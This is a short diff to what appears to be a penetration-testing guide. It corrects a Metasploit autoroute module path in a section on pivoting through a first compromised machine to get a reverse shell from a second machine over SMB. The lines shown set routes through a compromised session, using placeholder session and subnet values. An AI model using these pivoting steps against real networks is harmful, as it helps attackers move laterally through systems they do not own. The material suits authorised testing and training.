@@ -755,7 +755,7 @@ exploit
 ##### Establish Reverse Shell from Second Victim with SMB using Proxy
 ```bash
 # Add routes to both victims, pointing to Victim 1's session.
-use post/windows/manage/autoroute
+use post/multi/manage/autoroute
 set SESSION [Victim 1's Session ID]
 set SUBNET [Victim 1's Subnet]
 set SUBNET [Victim 2's Subnet]
